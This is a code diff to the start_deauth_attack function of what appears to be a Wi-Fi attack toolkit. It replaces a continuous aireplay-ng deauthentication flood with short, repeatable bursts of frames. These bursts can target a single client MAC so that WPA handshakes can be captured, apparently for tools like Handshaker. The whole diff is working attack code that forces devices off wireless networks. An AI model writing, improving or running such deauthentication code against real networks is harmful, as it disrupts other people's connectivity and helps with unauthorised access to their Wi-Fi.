@@ -1083,12 +1083,32 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]], quiet:
         clients = find_connected_clients(interface, bssid, channel)
 
     if quiet:
-        # Handshake capture workflows (e.g. Handshaker) need a deauth pulse but not
-        # the full interactive output. Keep it minimal and start broadcast deauth.
+        # Handshake capture workflows (e.g. Handshaker) need short, repeatable
+        # pulses rather than long continuous floods. Prefer targeted pulse when
+        # a client MAC is provided.
+        client_mac = str(target.get("client") or "").strip().lower()
+        if len(client_mac) == 17 and client_mac.count(":") == 5:
+            client_opt = ["-c", client_mac]
+            method_label = "aireplay-ng (targeted burst)"
+        else:
+            client_opt = []
+            method_label = "aireplay-ng (broadcast burst)"
+
+        deauth_count_raw = target.get("deauth_count")
+        try:
+            deauth_count = int(deauth_count_raw) if deauth_count_raw is not None else 16
+        except (TypeError, ValueError):
+            deauth_count = 16
+        if deauth_count < 1:
+            deauth_count = 1
+        if deauth_count > 128:
+            deauth_count = 128
+
         cmd = [
             "aireplay-ng",
-            "-0", "0",  # 0 means continuous
+            "-0", str(deauth_count),  # finite burst pulse
             "-a", bssid,
+            *client_opt,
             interface,
         ]
         try:
@@ -1105,13 +1125,17 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]], quiet:
             logging.error("Failed to start deauth process: %s", exc)
             return False
 
-        time.sleep(2)
+        # Burst commands can legitimately finish quickly with returncode 0.
+        time.sleep(0.4)
         if ATTACK_PROCESS.poll() is not None:
+            rc = ATTACK_PROCESS.returncode
             ATTACK_PROCESS = None
-            return False
+            ATTACK_RUNNING = False
+            ATTACK_METHOD = method_label
+            return rc == 0
 
         ATTACK_RUNNING = True
-        ATTACK_METHOD = "aireplay-ng (broadcast)"
+        ATTACK_METHOD = method_label
         return True
 
     # Try different attack methods
